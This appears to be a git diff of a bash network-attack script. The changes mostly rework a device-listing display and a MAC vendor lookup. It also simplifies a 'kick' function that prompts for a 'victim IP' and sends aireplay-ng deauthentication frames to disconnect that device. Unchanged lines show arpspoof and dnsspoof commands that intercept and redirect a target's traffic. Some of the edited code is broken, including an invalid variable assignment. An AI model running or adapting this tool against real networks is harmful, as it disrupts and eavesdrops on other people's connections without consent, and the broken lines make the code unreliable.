@@ -13,6 +13,8 @@ frequency=(`iwconfig $interface  | grep Frequency | awk -F' ' '{ print $2 }' | c
 channel=""
 afterMe=false
 declare -a nameStore
+declare -a vendors
+clear
 
 
 #function for storing the nmap info running in the background
@@ -23,6 +25,24 @@ while true; do
 	cat tempInfo.txt > info.txt
 done
 }
+
+
+
+function Vendor(){
+	for (( j=0; j<=${#idListMac[@]}; j++ )); do 
+		if [ "$1" == "${idListMac[$j]}" ]; then
+			vendors[$2]=${idListName[j]}
+		fi
+	done
+}
+
+
+
+
+if [[ "$gateway" = "" ]]; then
+read -p "You're not connected to the interwebs"
+exit
+fi
 
 
 
@@ -189,62 +209,22 @@ echo "$mac $tempName" >> personalNameInfo.txt
 function kick(){
 name=""
 ip=""
-choice=""
-echo "Would you like to kick by name or IP?"
-read choice
-case "$choice" in
-	"name")
-		read -p "Please enter victim name: " name
-
-
-		for (( i=0; i<=${#nameStore[@]}; i++ )); do
-			nameTest=(`echo "${nameStore[i]}" | cut -d '-' -f1`) 
-			ipList=(`echo "${nameStore[i]}" | cut -d '-' -f2`) 
-			if [ "$nameTest" == "$name" ]; then
-				ip=$ipList
-			fi
-			nameTest=""
-			ipList=""
-		done
+	read -p "Please enter victim IP: " ip
 		mac=(`cat afterInfo.txt | grep -io '[0-9A-F]\{2\}\(:[0-9A-F]\{2\}\)\{5\}'`)
 		ips=(`cat afterInfo.txt | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}"`)
-		for (( i=0; i<=${#mac[@]}; i++ )); do
-			if [ "${ips[i]}" == "$myIp" ]; then
-				afterMe=true
-			else
-				if [ "${ips[i]}" == "$ip" ]; then
-					if ! $afterMe; then
-						aireplay-ng -0 10 -a $gatemac -c ${mac[i]} mon0
-						read -p dfsdf
-					else
-						aireplay-ng -0 10 -a $gatemac -c ${mac[i-1]} mon0
-						read -p dfsdf
-					fi
+	for (( i=0; i<=${#mac[@]}; i++ )); do
+		if [ "${ips[i]}" == "$myIp" ]; then
+			afterMe=true
+		else
+			if [ "${ips[i]}" == "$ip" ]; then
+				if ! $afterMe; then
+					aireplay-ng -0 10 -a $gatemac -c ${mac[i]} mon0
+				else
+					aireplay-ng -0 10 -a $gatemac -c ${mac[i-1]} mon0
 				fi
 			fi
-		done
-		afterMe=false
-		;;
-	"ip")
-		read -p "Please enter victim IP: " ip
-			mac=(`cat afterInfo.txt | grep -io '[0-9A-F]\{2\}\(:[0-9A-F]\{2\}\)\{5\}'`)
-			ips=(`cat afterInfo.txt | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}"`)
-		for (( i=0; i<=${#mac[@]}; i++ )); do
-			if [ "${ips[i]}" == "$myIp" ]; then
-				afterMe=true
-			else
-				if [ "${ips[i]}" == "$ip" ]; then
-					if ! $afterMe; then
-						aireplay-ng -0 10 -a $gatemac -c ${mac[i]} mon0
-					else
-						aireplay-ng -0 10 -a $gatemac -c ${mac[i-1]} mon0
-					fi
-				fi
-			fi
-		done
-		afterMe=false
-		;;
-esac
+		fi
+	done
 }
 
 
@@ -289,7 +269,7 @@ arpspoof -i $interface -t $gateway $ip &
 dnsspoof -i $interface -f  spoofhosts.txt host  $ip  and  udp  port 53
 }
 
-
+clear
 
 #main network analyzer output
 while true;do
@@ -297,10 +277,9 @@ while true;do
 	keypress=''
 	while [ "x$keypress" = "x" ]; do
 		if ! diff afterInfo.txt info.txt > /dev/null ; then
-			clear
+			me=""
 			#your information and creates arrays of the nmap info
-			echo "Your Interface: "$interface
-			echo "Your IP: "$myIp
+			
 			macVendorAssign=""
 			mac=(`cat info.txt | grep -io '[0-9A-F]\{2\}\(:[0-9A-F]\{2\}\)\{5\}'`)
 			ip=(`cat info.txt | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}"`)
@@ -308,11 +287,11 @@ while true;do
 			macIdName=(`cat info.txt | grep -w 'MAC' | cut -d' ' -f 4- | sed -e 's/ /_/g'`)
 			idListMac=(`cat macIds.txt | awk '{print $1}'`)
 			idListName=(`cat macIds.txt | awk '{print $2}'`)
-			echo -e "MAC:\t\t\tIP:\t\tWho they are:\tPackets:\tDevice type:"
 			for (( i=0; i<=${#mac[@]}; i++ )); do
 				if [ "${ip[i]}" == "$myIp" ]; then
 					#output the line of your MAC and IP
-					echo -e "$myMac\t$myIp\tThis is You"
+					me=$i
+					
 					afterMe=true
 				else
 					#output all the MACs and their info that are before yours in the arrays
@@ -322,15 +301,38 @@ while true;do
 						if [ "$nameAssign" = "" ]; then
 							nameAssign="\t" 
 						fi
-						for (( j=0; j<=${#idListMac[@]}; j++ )); do 
-							if [ "${macId[i]}" == "${idListMac[j]}" ]; then
-								macVendorAssign=${idListName[j]}
+
+
+
+
+
+
+						for (( j=0; j<=${#nameStore[@]-1}; j++ )); do 
+							nameStoreMac=(`echo "${nameStore[$j]}" | cut -d "^" -f1`)
+							nameStoreName=(`echo "${nameStore[$j]}" | cut -d "^" -f2`)
+							if [ "$nameStoreMac" == "${macId[$i]}" ]; then
+								vendors[$i]=$nameStoreName
 							fi
 						done
-						if [ "$macVendorAssign" = "" ]; then
-							macVendorAssign=${macIdName[i]}
+
+
+						if [[ "${vendors[$i]}" == "" && "${macId[$i]}" != "" ]]; then
+							Vendor ${macId[$i]} $i 
+							if [ "${vendors[$i]}" = "" ]; then
+							${vendors[$i]}=${macIdName[i]}
+							fi
+							nameStore[${#nameStore[@]}]="${macId[$i]}^${vendors[$i]}"
+			
 						fi
-						echo -e "${mac[i]}\t${ip[i]}\t$nameAssign\t$packets\t\t$macVendorAssign"
+
+
+
+
+
+
+
+						
+						
 					else
 						#output all the MACs and their info that are after yours in the arrays
 						nameAssign=(`cat personalNameInfo.txt | grep -w ${mac[i-1]} | awk '{print $2}'`)
@@ -338,23 +340,64 @@ while true;do
 						if [ "$nameAssign" = "" ]; then
 							nameAssign="\t" 
 						fi
-						for (( j=0; j<=${#idListMac[@]}; j++ )); do 
-							if [ "${macId[i-1]}" == "${idListMac[j]}" ]; then
-								macVendorAssign=${idListName[j]}
-							fi
-						done
-						if [ "$macVendorAssign" = "" ]; then
-							macVendorAssign=${macIdName[i-1]} 
+
+
+
+
+						for (( j=0; j<=${#nameStore[@]-1}; j++ )); do 
+						nameStoreMac=(`echo "${nameStore[$j]}" | cut -d "^" -f1`)
+						nameStoreName=(`echo "${nameStore[$j]}" | cut -d "^" -f2`)
+						if [ "$nameStoreMac" == "${macId[$i-1]}" ]; then
+							vendors[$i]=$nameStoreName
 						fi
-						echo -e "${mac[i-1]}\t${ip[i]}\t$nameAssign\t$packets\t\t$macVendorAssign"
+						done
+
+
+						if [[ "${vendors[$i]}" == "" && "${macId[$i-1]}" != "" ]]; then
+							Vendor ${macId[$i-1]} $i 
+							if [ "${vendors[$i]}" = "" ]; then
+							${vendors[$i]}=${macIdName[$i-1]}
+							fi
+							nameStore[${#nameStore[@]}]="${macId[$i-1]}^${vendors[$i]}"
+							#ifSleep=false
+						fi
+
+
+
+
+
+
+
 					fi
 					#add to local nameStore and clears other local variables
-					nameStore[i]="$nameAssign-${ip[i]}"
+					names[i]=$nameAssign
 					nameAssign=""
+					packetCount[i]=$packets
 					packets=""
-					macVendorAssign=""
 				fi
 			done
+
+
+
+
+
+
+			clear
+			echo "Your Interface: "$interface
+			echo "Your IP: "$myIp
+			echo -e "MAC:\t\t\tIP:\t\tWho they are:\tPackets:\tDevice type:"
+			for (( i=0; i<=$me-1 ; i++ )); do 
+				echo -e "${mac[$i]}\t${ip[$i]}\t${names[$i]}\t${packetCount[$i]}\t\t${vendors[$i]}"
+			done
+			echo -e "$myMac\t$myIp\tThis is You"
+			for (( i=$me+1; i<=${#mac[@]}-$me ; i++ )); do 
+				echo -e "${mac[$i-1]}\t${ip[$i]}\t${names[$i]}\t${packetCount[$i]}\t\t${vendors[$i]}"
+			done
+
+
+
+
+
 			afterMe=false
 			cat info.txt > afterInfo.txt
 			#options for the commands
